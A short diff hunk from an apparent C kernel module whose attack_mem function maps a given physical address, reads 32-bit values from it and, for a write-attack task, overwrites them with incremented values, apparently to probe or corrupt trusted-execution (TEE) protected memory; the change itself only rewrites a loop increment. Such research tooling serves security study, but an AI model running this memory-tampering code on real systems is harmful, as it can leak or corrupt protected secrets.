@@ -173,7 +173,7 @@ void attack_mem(enum tee_task task) {
 			secret_mem = kmap(pfn_to_page(address >> 12));
 			pr_info("Received phy. addr: 0x%016llx mapped to 0x%016llx\n", 
 				address, (u64) secret_mem);
-				for (u64 offset = 0; offset < num_iterations; ++offset) {
+				for (u64 offset = 0; offset < num_iterations; offset++) {
 					const u32 value = ioread32(secret_mem + offset);
 					if (TEE_T_ATTACK_WRITE_MEM == task) {
 						iowrite32(value + 1, (secret_mem + offset));
